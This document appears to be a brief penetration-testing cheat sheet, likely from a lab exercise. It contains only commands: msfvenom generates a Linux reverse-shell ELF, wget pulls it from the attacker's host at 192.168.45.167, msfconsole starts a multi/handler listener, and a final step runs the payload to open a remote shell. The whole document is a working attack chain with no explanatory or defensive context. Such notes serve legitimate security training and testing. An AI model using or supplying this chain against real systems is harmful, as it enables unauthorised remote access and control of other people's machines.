msfvenom
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.45.167 LPORT=4444 -f elf > shell-x86.elf
```

download payload
```
wget http://192.168.45.167:8000/shell-x86.elf
```

start multi/handler
```
msfconsole -q -x 'use exploit/multi/handler;set LHOST 192.168.45.167;set LPORT 4444;set payload linux/x86/shell/reverse_tcp;run'
```

start revshell
```
chmod +x ./shell-x86.elf
./shell-x86.elf
```
